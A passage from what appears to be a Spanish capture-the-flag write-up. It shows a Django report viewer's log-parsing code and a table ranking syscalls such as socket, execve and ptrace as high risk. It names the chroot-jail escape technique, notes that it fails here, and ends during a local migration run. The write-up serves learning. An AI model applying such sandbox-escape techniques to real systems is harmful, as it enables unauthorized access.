    <span class="mtk1">render_vars</span> <span class="mtk5">=</span> <span class="mtk1">{</span><span class="mtk4">"md5"</span><span class="mtk1">:</span> <span class="mtk9 mtki">md5</span><span class="mtk1">,</span> <span class="mtk4">"ignore"</span><span class="mtk1">:</span> <span class="mtk1">ignore</span><span class="mtk1">,</span> <span class="mtk4">"low"</span><span class="mtk1">:</span> <span class="mtk1">low</span><span class="mtk1">,</span> <span class="mtk4">"med"</span><span class="mtk1">:</span> <span class="mtk1">med</span><span class="mtk1">,</span> <span class="mtk4">"high"</span><span class="mtk1">:</span> <span class="mtk1">high</span><span class="mtk1">}</span>  
    <span class="mtk5">return</span> <span class="mtk8">render</span><span class="mtk1">(</span><span class="mtk9 mtki">request</span><span class="mtk1">,</span> <span class="mtk4">'view.html'</span><span class="mtk1">,</span> <span class="mtk1">render_vars</span><span class="mtk1">)</span>


<span class="mtk7 mtki">def</span> <span class="mtk8">parse_log</span><span class="mtk1">(</span><span class="mtk9 mtki">path</span><span class="mtk1">):</span>
    <span class="mtk1">syscalls</span> <span class="mtk5">=</span> <span class="mtk1">[]</span>
    <span class="mtk5">with</span> <span class="mtk8">open</span><span class="mtk1">(</span><span class="mtk9 mtki">path</span><span class="mtk1">,</span> <span class="mtk4">'rb'</span><span class="mtk1">)</span> <span class="mtk5">as</span> <span class="mtk1">f</span><span class="mtk1">:</span>
        <span class="mtk1">chunk</span> <span class="mtk5">=</span> <span class="mtk1">f</span><span class="mtk1">.</span><span class="mtk8">read</span><span class="mtk1">(</span><span class="mtk6">8</span> <span class="mtk5">*</span> <span class="mtk6">8</span><span class="mtk1">)</span>
        <span class="mtk1">nums</span> <span class="mtk5">=</span> <span class="mtk8 mtku">struct</span><span class="mtk1">.</span><span class="mtk8">unpack</span><span class="mtk1">(</span><span class="mtk4">"q"</span> <span class="mtk5">*</span> <span class="mtk6">8</span><span class="mtk1">,</span> <span class="mtk1">chunk</span><span class="mtk1">)</span>
        <span class="mtk5">while</span> <span class="mtk8">len</span><span class="mtk1">(</span><span class="mtk1">chunk</span><span class="mtk1">)</span> <span class="mtk5">==</span> <span class="mtk6">8</span><span class="mtk5">*</span><span class="mtk6">8</span><span class="mtk1">:</span>
            <span class="mtk1">nums</span> <span class="mtk5">=</span> <span class="mtk8 mtku">struct</span><span class="mtk1">.</span><span class="mtk8">unpack</span><span class="mtk1">(</span><span class="mtk4">"q"</span> <span class="mtk5">*</span> <span class="mtk6">8</span><span class="mtk1">,</span> <span class="mtk1">chunk</span><span class="mtk1">)</span>
            <span class="mtk1">call</span> <span class="mtk5">=</span> <span class="mtk8 mtku">LoggedSyscall</span><span class="mtk1">(</span><span class="mtk1">nums</span><span class="mtk1">)</span>
            <span class="mtk1">syscalls</span><span class="mtk1">.</span><span class="mtk8">append</span><span class="mtk1">(</span><span class="mtk1">call</span><span class="mtk1">)</span>
            <span class="mtk1">chunk</span> <span class="mtk5">=</span> <span class="mtk1">f</span><span class="mtk1">.</span><span class="mtk8">read</span><span class="mtk1">(</span><span class="mtk6">8</span> <span class="mtk5">*</span> <span class="mtk6">8</span><span class="mtk1">)</span>
    <span class="mtk5">return</span> <span class="mtk1">syscalls</span>
</code></pre></div><p>Estas funciones se utilizan para parsear el archivo <code>log</code> generado por el binario <code>sandbox</code>, y lo renderiza en el reporte.</p><p>Se ve otro archivo llamado <code>viewer/syscalls.py</code> donde las instrucciones <code>syscall</code> del archivo <code>log</code> se clasifican en función de la configuración de registros (<code>$rax</code>, <code>$rdi</code>, <code>$rsi</code>&mldr;):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">import</span> <span class="mtk8 mtku">numbers</span>
<span class="mtk5">import</span> <span class="mtk8 mtku">enum</span>
<span class="mtk5">from</span> <span class="mtk8 mtku">typing</span> <span class="mtk5">import</span> <span class="mtk1">List</span><span class="mtk1">,</span> <span class="mtk8 mtku">Tuple</span>


<span class="mtk7 mtki">class</span> <span class="mtk8 mtku">SyscallClass</span><span class="mtk1">(</span><span class="mtk8 mtku">enum</span><span class="mtk1">.</span><span class="mtk8 mtku">Enum</span><span class="mtk1">):</span>
    <span class="mtk1">Ignore</span> <span class="mtk5">=</span> <span class="mtk6">0</span>
    <span class="mtk1">Low</span> <span class="mtk5">=</span> <span class="mtk6">1</span>
    <span class="mtk1">Medium</span> <span class="mtk5">=</span> <span class="mtk6">2</span>
    <span class="mtk1">High</span> <span class="mtk5">=</span> <span class="mtk6">3</span>

    <span class="mtk7 mtki">def</span> <span class="mtk7">__gt__</span><span class="mtk1">(</span><span class="mtk9 mtki">self</span><span class="mtk1">,</span> <span class="mtk9 mtki">other</span><span class="mtk1">):</span>
        <span class="mtk5">if</span> <span class="mtk8">isinstance</span><span class="mtk1">(</span><span class="mtk9 mtki">other</span><span class="mtk1">,</span> <span class="mtk8 mtku">numbers</span><span class="mtk1">.</span><span class="mtk8 mtku">Real</span><span class="mtk1">):</span>
            <span class="mtk5">return</span> <span class="mtk9 mtki">self</span><span class="mtk1">.</span><span class="mtk1">value</span> <span class="mtk5">&gt;</span> <span class="mtk9 mtki">other</span>
        <span class="mtk5">return</span> <span class="mtk9 mtki">self</span><span class="mtk1">.</span><span class="mtk1">value</span> <span class="mtk5">&gt;</span> <span class="mtk9 mtki">other</span><span class="mtk1">.value</span>

    <span class="mtk7 mtki">def</span> <span class="mtk7">__lt__</span><span class="mtk1">(</span><span class="mtk9 mtki">self</span><span class="mtk1">,</span> <span class="mtk9 mtki">other</span><span class="mtk1">):</span>
        <span class="mtk5">if</span> <span class="mtk8">isinstance</span><span class="mtk1">(</span><span class="mtk9 mtki">other</span><span class="mtk1">,</span> <span class="mtk8 mtku">numbers</span><span class="mtk1">.</span><span class="mtk8 mtku">Real</span><span class="mtk1">):</span>
            <span class="mtk5">return</span> <span class="mtk9 mtki">self</span><span class="mtk1">.</span><span class="mtk1">value</span> <span class="mtk5">&lt;</span> <span class="mtk9 mtki">other</span>
        <span class="mtk5">return</span> <span class="mtk9 mtki">self</span><span class="mtk1">.</span><span class="mtk1">value</span> <span class="mtk5">&lt;</span> <span class="mtk9 mtki">other</span><span class="mtk1">.value</span>


<span class="mtk3">#</span> <span class="mtk3">Class,</span> <span class="mtk3">name,</span> <span class="mtk3">syscall</span> <span class="mtk3">number,</span> <span class="mtk3">arg</span> <span class="mtk3">count</span>
<span class="mtk1">syscalls</span> <span class="mtk5">=</span> <span class="mtk1">[</span>
    <span class="mtk1">[</span><span class="mtk8 mtku">SyscallClass</span><span class="mtk1">.</span><span class="mtk1">Low</span><span class="mtk1">,</span> <span class="mtk4">"read"</span><span class="mtk1">,</span> <span class="mtk6">0</span><span class="mtk1">,</span> <span class="mtk6">3</span><span class="mtk1">],</span>
    <span class="mtk1">[</span><span class="mtk8 mtku">SyscallClass</span><span class="mtk1">.</span><span class="mtk1">Low</span><span class="mtk1">,</span> <span class="mtk4">"write"</span><span class="mtk1">,</span> <span class="mtk6">1</span><span class="mtk1">,</span> <span class="mtk6">3</span><span class="mtk1">],</span>
    <span class="mtk1">[</span><span class="mtk8 mtku">SyscallClass</span><span class="mtk1">.</span><span class="mtk1">Medium</span><span class="mtk1">,</span> <span class="mtk4">"open"</span><span class="mtk1">,</span> <span class="mtk6">2</span><span class="mtk1">,</span> <span class="mtk6">3</span><span class="mtk1">],</span>
    <span class="mtk1">[</span><span class="mtk8 mtku">SyscallClass</span><span class="mtk1">.</span><span class="mtk1">Low</span><span class="mtk1">,</span> <span class="mtk4">"close"</span><span class="mtk1">,</span> <span class="mtk6">3</span><span class="mtk1">,</span> <span class="mtk6">1</span><span class="mtk1">],</span>
    <span class="mtk1">[</span><span class="mtk8 mtku">SyscallClass</span><span class="mtk1">.</span><span class="mtk1">Medium</span><span class="mtk1">,</span> <span class="mtk4">"stat"</span><span class="mtk1">,</span> <span class="mtk6">4</span><span class="mtk1">,</span> <span class="mtk6">2</span><span class="mtk1">],</span>
    <span class="mtk1">[</span><span class="mtk8 mtku">SyscallClass</span><span class="mtk1">.</span><span class="mtk1">Medium</span><span class="mtk1">,</span> <span class="mtk4">"fstat"</span><span class="mtk1">,</span> <span class="mtk6">5</span><span class="mtk1">,</span> <span class="mtk6">2</span><span class="mtk1">],</span>
    <span class="mtk1">[</span><span class="mtk8 mtku">SyscallClass</span><span class="mtk1">.</span><span class="mtk1">Medium</span><span class="mtk1">,</span> <span class="mtk4">"lstat"</span><span class="mtk1">,</span> <span class="mtk6">6</span><span class="mtk1">,</span> <span class="mtk6">2</span><span class="mtk1">],</span>
    <span class="mtk1">[</span><span class="mtk8 mtku">SyscallClass</span><span class="mtk1">.</span><span class="mtk1">Medium</span><span class="mtk1">,</span> <span class="mtk4">"access"</span><span class="mtk1">,</span> <span class="mtk6">21</span><span class="mtk1">,</span> <span class="mtk6">2</span><span class="mtk1">],</span>
    <span class="mtk1">[</span><span class="mtk8 mtku">SyscallClass</span><span class="mtk1">.</span><span class="mtk1">Low</span><span class="mtk1">,</span> <span class="mtk4">"alarm"</span><span class="mtk1">,</span> <span class="mtk6">37</span><span class="mtk1">,</span> <span class="mtk6">1</span><span class="mtk1">],</span>
    <span class="mtk1">[</span><span class="mtk8 mtku">SyscallClass</span><span class="mtk1">.</span><span class="mtk1">High</span><span class="mtk1">,</span> <span class="mtk4">"socket"</span><span class="mtk1">,</span> <span class="mtk6">41</span><span class="mtk1">,</span> <span class="mtk6">3</span><span class="mtk1">],</span>
    <span class="mtk1">[</span><span class="mtk8 mtku">SyscallClass</span><span class="mtk1">.</span><span class="mtk1">High</span><span class="mtk1">,</span> <span class="mtk4">"connect"</span><span class="mtk1">,</span> <span class="mtk6">42</span><span class="mtk1">,</span> <span class="mtk6">3</span><span class="mtk1">],</span>
    <span class="mtk1">[</span><span class="mtk8 mtku">SyscallClass</span><span class="mtk1">.</span><span class="mtk1">High</span><span class="mtk1">,</span> <span class="mtk4">"accept"</span><span class="mtk1">,</span> <span class="mtk6">43</span><span class="mtk1">,</span> <span class="mtk6">3</span><span class="mtk1">],</span>
    <span class="mtk1">[</span><span class="mtk8 mtku">SyscallClass</span><span class="mtk1">.</span><span class="mtk1">High</span><span class="mtk1">,</span> <span class="mtk4">"shutdown"</span><span class="mtk1">,</span> <span class="mtk6">48</span><span class="mtk1">,</span> <span class="mtk6">2</span><span class="mtk1">],</span>
    <span class="mtk1">[</span><span class="mtk8 mtku">SyscallClass</span><span class="mtk1">.</span><span class="mtk1">High</span><span class="mtk1">,</span> <span class="mtk4">"bind"</span><span class="mtk1">,</span> <span class="mtk6">49</span><span class="mtk1">,</span> <span class="mtk6">3</span><span class="mtk1">],</span>
    <span class="mtk1">[</span><span class="mtk8 mtku">SyscallClass</span><span class="mtk1">.</span><span class="mtk1">High</span><span class="mtk1">,</span> <span class="mtk4">"listen"</span><span class="mtk1">,</span> <span class="mtk6">50</span><span class="mtk1">,</span> <span class="mtk6">2</span><span class="mtk1">],</span>
    <span class="mtk1">[</span><span class="mtk8 mtku">SyscallClass</span><span class="mtk1">.</span><span class="mtk1">Medium</span><span class="mtk1">,</span> <span class="mtk4">"clone"</span><span class="mtk1">,</span> <span class="mtk6">56</span><span class="mtk1">,</span> <span class="mtk6">5</span><span class="mtk1">],</span>
    <span class="mtk1">[</span><span class="mtk8 mtku">SyscallClass</span><span class="mtk1">.</span><span class="mtk1">Medium</span><span class="mtk1">,</span> <span class="mtk4">"fork"</span><span class="mtk1">,</span> <span class="mtk6">57</span><span class="mtk1">,</span> <span class="mtk6">0</span><span class="mtk1">],</span>
    <span class="mtk1">[</span><span class="mtk8 mtku">SyscallClass</span><span class="mtk1">.</span><span class="mtk1">Medium</span><span class="mtk1">,</span> <span class="mtk4">"vfork"</span><span class="mtk1">,</span> <span class="mtk6">58</span><span class="mtk1">,</span> <span class="mtk6">0</span><span class="mtk1">],</span>
    <span class="mtk1">[</span><span class="mtk8 mtku">SyscallClass</span><span class="mtk1">.</span><span class="mtk1">High</span><span class="mtk1">,</span> <span class="mtk4">"execve"</span><span class="mtk1">,</span> <span class="mtk6">59</span><span class="mtk1">,</span> <span class="mtk6">3</span><span class="mtk1">],</span>
    <span class="mtk1">[</span><span class="mtk8 mtku">SyscallClass</span><span class="mtk1">.</span><span class="mtk1">High</span><span class="mtk1">,</span> <span class="mtk4">"kill"</span><span class="mtk1">,</span> <span class="mtk6">62</span><span class="mtk1">,</span> <span class="mtk6">2</span><span class="mtk1">],</span>
    <span class="mtk1">[</span><span class="mtk8 mtku">SyscallClass</span><span class="mtk1">.</span><span class="mtk1">Medium</span><span class="mtk1">,</span> <span class="mtk4">"uname"</span><span class="mtk1">,</span> <span class="mtk6">63</span><span class="mtk1">,</span> <span class="mtk6">1</span><span class="mtk1">],</span>
    <span class="mtk1">[</span><span class="mtk8 mtku">SyscallClass</span><span class="mtk1">.</span><span class="mtk1">Medium</span><span class="mtk1">,</span> <span class="mtk4">"getdents"</span><span class="mtk1">,</span> <span class="mtk6">78</span><span class="mtk1">,</span> <span class="mtk6">3</span><span class="mtk1">],</span>
    <span class="mtk1">[</span><span class="mtk8 mtku">SyscallClass</span><span class="mtk1">.</span><span class="mtk1">Medium</span><span class="mtk1">,</span> <span class="mtk4">"getcwd"</span><span class="mtk1">,</span> <span class="mtk6">79</span><span class="mtk1">,</span> <span class="mtk6">2</span><span class="mtk1">],</span>
    <span class="mtk1">[</span><span class="mtk8 mtku">SyscallClass</span><span class="mtk1">.</span><span class="mtk1">Medium</span><span class="mtk1">,</span> <span class="mtk4">"chdir"</span><span class="mtk1">,</span> <span class="mtk6">80</span><span class="mtk1">,</span> <span class="mtk6">1</span><span class="mtk1">],</span>
    <span class="mtk1">[</span><span class="mtk8 mtku">SyscallClass</span><span class="mtk1">.</span><span class="mtk1">Medium</span><span class="mtk1">,</span> <span class="mtk4">"fchdir"</span><span class="mtk1">,</span> <span class="mtk6">81</span><span class="mtk1">,</span> <span class="mtk6">1</span><span class="mtk1">],</span>
    <span class="mtk1">[</span><span class="mtk8 mtku">SyscallClass</span><span class="mtk1">.</span><span class="mtk1">High</span><span class="mtk1">,</span> <span class="mtk4">"rename"</span><span class="mtk1">,</span> <span class="mtk6">82</span><span class="mtk1">,</span> <span class="mtk6">2</span><span class="mtk1">],</span>
    <span class="mtk1">[</span><span class="mtk8 mtku">SyscallClass</span><span class="mtk1">.</span><span class="mtk1">Low</span><span class="mtk1">,</span> <span class="mtk4">"mkdir"</span><span class="mtk1">,</span> <span class="mtk6">83</span><span class="mtk1">,</span> <span class="mtk6">2</span><span class="mtk1">],</span>
    <span class="mtk1">[</span><span class="mtk8 mtku">SyscallClass</span><span class="mtk1">.</span><span class="mtk1">High</span><span class="mtk1">,</span> <span class="mtk4">"rmdir"</span><span class="mtk1">,</span> <span class="mtk6">84</span><span class="mtk1">,</span> <span class="mtk6">1</span><span class="mtk1">],</span>
    <span class="mtk1">[</span><span class="mtk8 mtku">SyscallClass</span><span class="mtk1">.</span><span class="mtk1">High</span><span class="mtk1">,</span> <span class="mtk4">"unlink"</span><span class="mtk1">,</span> <span class="mtk6">87</span><span class="mtk1">,</span> <span class="mtk6">1</span><span class="mtk1">],</span>
    <span class="mtk1">[</span><span class="mtk8 mtku">SyscallClass</span><span class="mtk1">.</span><span class="mtk1">Medium</span><span class="mtk1">,</span> <span class="mtk4">"chmod"</span><span class="mtk1">,</span> <span class="mtk6">90</span><span class="mtk1">,</span> <span class="mtk6">2</span><span class="mtk1">],</span>
    <span class="mtk1">[</span><span class="mtk8 mtku">SyscallClass</span><span class="mtk1">.</span><span class="mtk1">Medium</span><span class="mtk1">,</span> <span class="mtk4">"fchmod"</span><span class="mtk1">,</span> <span class="mtk6">91</span><span class="mtk1">,</span> <span class="mtk6">2</span><span class="mtk1">],</span>
    <span class="mtk1">[</span><span class="mtk8 mtku">SyscallClass</span><span class="mtk1">.</span><span class="mtk1">High</span><span class="mtk1">,</span> <span class="mtk4">"chown"</span><span class="mtk1">,</span> <span class="mtk6">92</span><span class="mtk1">,</span> <span class="mtk6">3</span><span class="mtk1">],</span>
    <span class="mtk1">[</span><span class="mtk8 mtku">SyscallClass</span><span class="mtk1">.</span><span class="mtk1">High</span><span class="mtk1">,</span> <span class="mtk4">"fchown"</span><span class="mtk1">,</span> <span class="mtk6">93</span><span class="mtk1">,</span> <span class="mtk6">3</span><span class="mtk1">],</span>
    <span class="mtk1">[</span><span class="mtk8 mtku">SyscallClass</span><span class="mtk1">.</span><span class="mtk1">High</span><span class="mtk1">,</span> <span class="mtk4">"ptrace"</span><span class="mtk1">,</span> <span class="mtk6">101</span><span class="mtk1">,</span> <span class="mtk6">4</span><span class="mtk1">],</span>
<span class="mtk1">]</span>

<span class="mtk1">template</span> <span class="mtk5">=</span> <span class="mtk4">"""&lt;div</span> <span class="mtk4">class="alert</span> <span class="mtk4">alert-</span><span class="mtk6">{}</span><span class="mtk4">"</span> <span class="mtk4">style="width:</span> <span class="mtk4">80%"</span> <span class="mtk4">role="alert"&gt;</span>
<span class="mtk4">&lt;p</span> <span class="mtk4">style="font-family:</span> <span class="mtk4">Courier</span> <span class="mtk4">New,Courier,Lucida</span> <span class="mtk4">Sans</span> <span class="mtk4">Typewriter,Lucida</span> <span class="mtk4">Typewriter,monospace;"&gt;</span><span class="mtk6">{}</span><span class="mtk4">(</span><span class="mtk6">{}</span><span class="mtk4">)</span> <span class="mtk4">=</span> <span class="mtk6">{}</span><span class="mtk4">&lt;/pre&gt;</span>  
<span class="mtk4">&lt;/div&gt;</span>
<span class="mtk4">"""</span>


<span class="mtk7 mtki">class</span> <span class="mtk8 mtku">LoggedSyscall</span><span class="mtk1">:</span>
    <span class="mtk1">sys_num</span><span class="mtk1">:</span> <span class="mtk8 mtku">int</span>
    <span class="mtk1">rdi</span><span class="mtk1">:</span> <span class="mtk8 mtku">int</span>
    <span class="mtk1">rsi</span><span class="mtk1">:</span> <span class="mtk8 mtku">int</span>
    <span class="mtk1">rdx</span><span class="mtk1">:</span> <span class="mtk8 mtku">int</span>
    <span class="mtk1">r10</span><span class="mtk1">:</span> <span class="mtk8 mtku">int</span>
    <span class="mtk1">r8</span><span class="mtk1">:</span> <span class="mtk8 mtku">int</span>
    <span class="mtk1">r9</span><span class="mtk1">:</span> <span class="mtk8 mtku">int</span>
    <span class="mtk1">ret</span><span class="mtk1">:</span> <span class="mtk8 mtku">int</span>

    <span class="mtk7 mtki">def</span> <span class="mtk7">__init__</span><span class="mtk1">(</span><span class="mtk9 mtki">self</span><span class="mtk1">,</span> <span class="mtk9 mtki">values</span><span class="mtk1">):</span>
        <span class="mtk9 mtki">self</span><span class="mtk1">.</span><span class="mtk1">sys_num</span><span class="mtk1">,</span> <span class="mtk9 mtki">self</span><span class="mtk1">.</span><span class="mtk1">rdi</span><span class="mtk1">,</span> <span class="mtk9 mtki">self</span><span class="mtk1">.</span><span class="mtk1">rsi</span><span class="mtk1">,</span> <span class="mtk9 mtki">self</span><span class="mtk1">.</span><span class="mtk1">rdx</span><span class="mtk1">,</span> <span class="mtk1">\</span>
            <span class="mtk9 mtki">self</span><span class="mtk1">.</span><span class="mtk1">r10</span><span class="mtk1">,</span> <span class="mtk9 mtki">self</span><span class="mtk1">.</span><span class="mtk1">r8</span><span class="mtk1">,</span> <span class="mtk9 mtki">self</span><span class="mtk1">.</span><span class="mtk1">r9</span><span class="mtk1">,</span> <span class="mtk9 mtki">self</span><span class="mtk1">.</span><span class="mtk1">ret</span> <span class="mtk5">=</span> <span class="mtk9 mtki">values</span>

    <span class="mtk7 mtki">def</span> <span class="mtk8">get_args</span><span class="mtk1">(</span><span class="mtk9 mtki">self</span><span class="mtk1">,</span> <span class="mtk9 mtki">count</span><span class="mtk1">)</span> <span class="mtk1">-&gt;</span> <span class="mtk1">List</span><span class="mtk1">[</span><span class="mtk8 mtku">int</span><span class="mtk1">]:</span>
        <span class="mtk5">if</span> <span class="mtk9 mtki">count</span> <span class="mtk5">==</span> <span class="mtk6">0</span><span class="mtk1">:</span>
            <span class="mtk5">return</span> <span class="mtk1">[]</span>
        <span class="mtk5">if</span> <span class="mtk9 mtki">count</span> <span class="mtk5">==</span> <span class="mtk6">1</span><span class="mtk1">:</span>
            <span class="mtk5">return</span> <span class="mtk1">[</span><span class="mtk9 mtki">self</span><span class="mtk1">.</span><span class="mtk1">rdi</span><span class="mtk1">]</span>
        <span class="mtk5">if</span> <span class="mtk9 mtki">count</span> <span class="mtk5">==</span> <span class="mtk6">2</span><span class="mtk1">:</span>
            <span class="mtk5">return</span> <span class="mtk1">[</span><span class="mtk9 mtki">self</span><span class="mtk1">.</span><span class="mtk1">rdi</span><span class="mtk1">,</span> <span class="mtk9 mtki">self</span><span class="mtk1">.</span><span class="mtk1">rsi</span><span class="mtk1">]</span>
        <span class="mtk5">if</span> <span class="mtk9 mtki">count</span> <span class="mtk5">==</span> <span class="mtk6">3</span><span class="mtk1">:</span>
            <span class="mtk5">return</span> <span class="mtk1">[</span><span class="mtk9 mtki">self</span><span class="mtk1">.</span><span class="mtk1">rdi</span><span class="mtk1">,</span> <span class="mtk9 mtki">self</span><span class="mtk1">.</span><span class="mtk1">rsi</span><span class="mtk1">,</span> <span class="mtk9 mtki">self</span><span class="mtk1">.</span><span class="mtk1">rdx</span><span class="mtk1">]</span>
        <span class="mtk5">if</span> <span class="mtk9 mtki">count</span> <span class="mtk5">==</span> <span class="mtk6">4</span><span class="mtk1">:</span>
            <span class="mtk5">return</span> <span class="mtk1">[</span><span class="mtk9 mtki">self</span><span class="mtk1">.</span><span class="mtk1">rdi</span><span class="mtk1">,</span> <span class="mtk9 mtki">self</span><span class="mtk1">.</span><span class="mtk1">rsi</span><span class="mtk1">,</span> <span class="mtk9 mtki">self</span><span class="mtk1">.</span><span class="mtk1">rdx</span><span class="mtk1">,</span> <span class="mtk9 mtki">self</span><span class="mtk1">.</span><span class="mtk1">r10</span><span class="mtk1">]</span>
        <span class="mtk5">if</span> <span class="mtk9 mtki">count</span> <span class="mtk5">==</span> <span class="mtk6">5</span><span class="mtk1">:</span>
            <span class="mtk5">return</span> <span class="mtk1">[</span><span class="mtk9 mtki">self</span><span class="mtk1">.</span><span class="mtk1">rdi</span><span class="mtk1">,</span> <span class="mtk9 mtki">self</span><span class="mtk1">.</span><span class="mtk1">rsi</span><span class="mtk1">,</span> <span class="mtk9 mtki">self</span><span class="mtk1">.</span><span class="mtk1">rdx</span><span class="mtk1">,</span> <span class="mtk9 mtki">self</span><span class="mtk1">.</span><span class="mtk1">r10</span><span class="mtk1">,</span> <span class="mtk9 mtki">self</span><span class="mtk1">.</span><span class="mtk1">r8</span><span class="mtk1">]</span>
        <span class="mtk5">if</span> <span class="mtk9 mtki">count</span> <span class="mtk5">==</span> <span class="mtk6">6</span><span class="mtk1">:</span>
            <span class="mtk5">return</span> <span class="mtk1">[</span><span class="mtk9 mtki">self</span><span class="mtk1">.</span><span class="mtk1">rdi</span><span class="mtk1">,</span> <span class="mtk9 mtki">self</span><span class="mtk1">.</span><span class="mtk1">rsi</span><span class="mtk1">,</span> <span class="mtk9 mtki">self</span><span class="mtk1">.</span><span class="mtk1">rdx</span><span class="mtk1">,</span> <span class="mtk9 mtki">self</span><span class="mtk1">.</span><span class="mtk1">r10</span><span class="mtk1">,</span> <span class="mtk9 mtki">self</span><span class="mtk1">.</span><span class="mtk1">r8</span><span class="mtk1">,</span> <span class="mtk9 mtki">self</span><span class="mtk1">.</span><span class="mtk1">r9</span><span class="mtk1">]</span>

    <span class="mtk7 mtki">def</span> <span class="mtk8">render</span><span class="mtk1">(</span><span class="mtk9 mtki">self</span><span class="mtk1">)</span> <span class="mtk1">-&gt;</span> <span class="mtk8 mtku">Tuple</span><span class="mtk1">[</span><span class="mtk8 mtku">SyscallClass</span><span class="mtk1">,</span> <span class="mtk8 mtku">str</span><span class="mtk1">]:</span>
        <span class="mtk1">status</span> <span class="mtk5">=</span> <span class="mtk4">"light"</span>
        <span class="mtk5">for</span> <span class="mtk1">sys_entry</span> <span class="mtk5">in</span> <span class="mtk1">syscalls</span><span class="mtk1">:</span>
            <span class="mtk5">if</span> <span class="mtk1">sys_entry</span><span class="mtk1">[</span><span class="mtk6">2</span><span class="mtk1">]</span> <span class="mtk5">==</span> <span class="mtk9 mtki">self</span><span class="mtk1">.</span><span class="mtk1">sys_num</span><span class="mtk1">:</span>
                <span class="mtk5">if</span> <span class="mtk1">sys_entry</span><span class="mtk1">[</span><span class="mtk6">0</span><span class="mtk1">]</span> <span class="mtk5">==</span> <span class="mtk8 mtku">SyscallClass</span><span class="mtk1">.</span><span class="mtk1">Low</span><span class="mtk1">:</span>
                    <span class="mtk1">status</span> <span class="mtk5">=</span> <span class="mtk4">"success"</span>
                <span class="mtk5">elif</span> <span class="mtk1">sys_entry</span><span class="mtk1">[</span><span class="mtk6">0</span><span class="mtk1">]</span> <span class="mtk5">==</span> <span class="mtk8 mtku">SyscallClass</span><span class="mtk1">.</span><span class="mtk1">Medium</span><span class="mtk1">:</span>
                    <span class="mtk1">status</span> <span class="mtk5">=</span> <span class="mtk4">"warning"</span>
                <span class="mtk5">elif</span> <span class="mtk1">sys_entry</span><span class="mtk1">[</span><span class="mtk6">0</span><span class="mtk1">]</span> <span class="mtk5">==</span> <span class="mtk8 mtku">SyscallClass</span><span class="mtk1">.</span><span class="mtk1">High</span><span class="mtk1">:</span>
                    <span class="mtk1">status</span> <span class="mtk5">=</span> <span class="mtk4">"danger"</span>
                <span class="mtk1">rendered</span> <span class="mtk5">=</span> <span class="mtk1">template</span><span class="mtk1">.</span><span class="mtk8">format</span><span class="mtk1">(</span><span class="mtk1">status</span><span class="mtk1">,</span> <span class="mtk7 mtki">f</span><span class="mtk4">"</span><span class="mtk6">{</span><span class="mtk1">sys_entry</span><span class="mtk1">[</span><span class="mtk6">1</span><span class="mtk1">]</span><span class="mtk6">}</span><span class="mtk4">"</span><span class="mtk1">,</span> <span class="mtk4">",</span> <span class="mtk4">"</span><span class="mtk1">.</span><span class="mtk8">join</span><span class="mtk1">([</span>
                    <span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk1">x</span><span class="mtk1">)</span> <span class="mtk5">for</span> <span class="mtk1">x</span> <span class="mtk5">in</span> <span class="mtk9 mtki">self</span><span class="mtk1">.</span><span class="mtk8">get_args</span><span class="mtk1">(</span><span class="mtk1">sys_entry</span><span class="mtk1">[</span><span class="mtk6">3</span><span class="mtk1">])</span>
                <span class="mtk1">]),</span> <span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk9 mtki">self</span><span class="mtk1">.</span><span class="mtk1">ret</span><span class="mtk1">))</span>
                <span class="mtk5">return</span> <span class="mtk1">sys_entry</span><span class="mtk1">[</span><span class="mtk6">0</span><span class="mtk1">],</span> <span class="mtk1">rendered</span>
        <span class="mtk1">rendered</span> <span class="mtk5">=</span> <span class="mtk1">template</span><span class="mtk1">.</span><span class="mtk8">format</span><span class="mtk1">(</span><span class="mtk1">status</span><span class="mtk1">,</span> <span class="mtk7 mtki">f</span><span class="mtk4">"sys_</span><span class="mtk6">{</span><span class="mtk9 mtki">self</span><span class="mtk1">.</span><span class="mtk1">sys_num</span><span class="mtk6">}</span><span class="mtk4">"</span><span class="mtk1">,</span> <span class="mtk4">""</span><span class="mtk1">,</span> <span class="mtk8">hex</span><span class="mtk1">(</span><span class="mtk9 mtki">self</span><span class="mtk1">.</span><span class="mtk1">ret</span><span class="mtk1">))</span>
        <span class="mtk5">return</span> <span class="mtk8 mtku">SyscallClass</span><span class="mtk1">.</span><span class="mtk1">Ignore</span><span class="mtk1">,</span> <span class="mtk1">rendered</span>
</code></pre></div><h2 id="abusando-de-malas-configuraciones">Abusando de malas configuraciones</h2><p>En primer lugar, podemos intentar escapar de la jaula <code>chroot</code> con la técnica tradicional de crear otro entorno de <code>chroot</code>, escalar hacia arriba hasta el directorio raíz real y llamar a <code>chroot</code> de nuevo. No obstante, esto no es posible porque el entorno de <code>chroot</code> está correctamente configurado.</p><p>Para poder realizar pruebas en local, copié los archivos fuente en esta máquina e inicié el mismo proyecto que ellos tienen:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">manage.py</span> migrate
<span class="code-cyan">Operations to perform:</span>
  Apply all migrations: admin, auth, contenttypes, sessions
<span class="code-cyan">Running migrations:</span>
  Applying contenttypes.0001_initial... <span class="code-green">OK</span>
  Applying auth.0001_initial... <span class="code-green">OK</span>
  Applying admin.0001_initial... <span class="code-green">OK</span>
  Applying admin.0002_logentry_remove_auto_add... <span class="code-green">OK</span>
  Applying admin.0003_logentry_add_action_flag_choices... <span class="code-green">OK</span>
  Applying contenttypes.0002_remove_content_type_name... <span class="code-green">OK</span>
  Applying auth.0002_alter_permission_name_max_length... <span class="code-green">OK</span>
  Applying auth.0003_alter_user_email_max_length... <span class="code-green">OK</span>
  Applying auth.0004_alter_user_username_opts... <span class="code-green">OK</span>
  Applying auth.0005_alter_user_last_login_null... <span class="code-green">OK</span>
  Applying auth.0006_require_contenttypes_0002... <span class="code-green">OK</span>
  Applying auth.0007_alter_validators_add_error_messages... <span class="code-green">OK</span>  
  Applying auth.0008_alter_user_username_max_length... <span class="code-green">OK</span>
  Applying auth.0009_alter_user_last_name_max_length... <span class="code-green">OK</span>
  Applying auth.0010_alter_group_name_max_length... <span class="code-green">OK</span>
  Applying auth.0011_update_proxy_permissions... <span class="code-green">OK</span>
  Applying auth.0012_alter_user_first_name_max_length... <span class="code-green">OK</span>
